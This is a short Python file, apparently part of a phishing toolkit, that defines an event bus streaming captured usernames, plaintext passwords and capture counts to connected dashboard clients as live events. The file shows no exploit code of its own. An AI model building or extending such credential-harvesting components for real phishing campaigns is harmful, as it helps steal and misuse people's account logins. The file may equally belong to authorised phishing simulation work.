import asyncio
import json
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from phishing.credentials import CapturedCredential


class EventBus:
    def __init__(self) -> None:
        self._clients: set[asyncio.Queue[str]] = set()

    def add_client(self) -> asyncio.Queue[str]:
        queue: asyncio.Queue[str] = asyncio.Queue()
        self._clients.add(queue)
        return queue

    def remove_client(self, queue: asyncio.Queue[str]) -> None:
        self._clients.discard(queue)

    def broadcast_credential(self, credential: CapturedCredential) -> None:
        payload = json.dumps({
            "username": credential.username,
            "password": credential.password,
            "nCaptures": credential.n_captures,
            "lastCapturedAt": credential.last_captured_at.isoformat(),
        })
        message = f"event: credential-captured\ndata: {payload}\n\n"
        for queue in self._clients:
            queue.put_nowait(message)


event_bus = EventBus()
